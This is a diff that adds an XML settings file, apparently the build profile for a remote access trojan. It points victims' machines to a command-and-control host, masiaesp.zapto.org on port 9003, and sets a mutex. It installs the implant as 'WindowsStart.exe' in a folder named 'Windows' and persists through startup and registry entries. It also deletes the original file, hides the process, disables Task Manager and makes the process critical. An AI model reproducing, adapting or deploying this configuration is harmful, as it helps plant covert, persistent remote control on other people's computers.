@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ProfileSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <IP>masiaesp.zapto.org</IP>
+  <Port>9003</Port>
+  <ServerID>Default</ServerID>
+  <Mutex>FZ4TU2ACRTGGXGH47JHQ0XYLPGNZJMWETUSH9AG0GRK6EWGZNUPCHWE0JPMV21WSHRZCDR00Z5LJKV3A0H0HB1QQ4XNY1WK7GW1V89QWFTXXDSYZ9HS2IWDOEPJZZ8KIN8Z35LYVHLP</Mutex>
+  <EnableStartup>true</EnableStartup>
+  <Key>Windows</Key>
+  <FolderName>Windows</FolderName>
+  <FileName>WindowsStart.exe</FileName>
+  <Roaming>true</Roaming>
+  <Local>false</Local>
+  <Temp>false</Temp>
+  <Melt>true</Melt>
+  <Hide>true</Hide>
+  <Zonecheck>true</Zonecheck>
+  <Registry>true</Registry>
+  <DisableTaskManager>true</DisableTaskManager>
+  <ProcessKernalSecurity>true</ProcessKernalSecurity>
+  <ProcessCritical>true</ProcessCritical>
+</ProfileSettings>
